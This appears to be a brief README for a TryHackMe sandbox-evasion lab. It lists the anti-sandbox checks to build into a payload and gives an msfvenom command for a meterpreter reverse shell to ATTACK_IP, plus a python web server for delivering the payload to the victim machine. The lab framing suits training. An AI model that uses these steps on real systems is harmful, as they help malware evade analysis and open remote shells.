# Sandbox_Evasion_THM
escaping the sandbox checker (SandboxChecker.exe)
Check and see if the device is joined to an Active Directory Domain
Check if the system memory is greater than 1GB of RAM
Implement an outbound HTTP request to 10.10.10.10
Implement a 60-second sleep timer before your payload is retrieved from your web server
first u need to create payload from ur attacker machine 
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACK_IP LPORT=4545 -f raw -o index.raw
second open ur webserver to download the code on ur windows machine (victim machine )
 python3 -m http.server (port is by default 8000)
 then go to ur victim machine and run code below 
 search for code u download 
 build it on exe 
 example
 C:\Users\Administrator\Desktop\Materials>.\SandboxChecker.exe sendbox_evasion_THM.exe
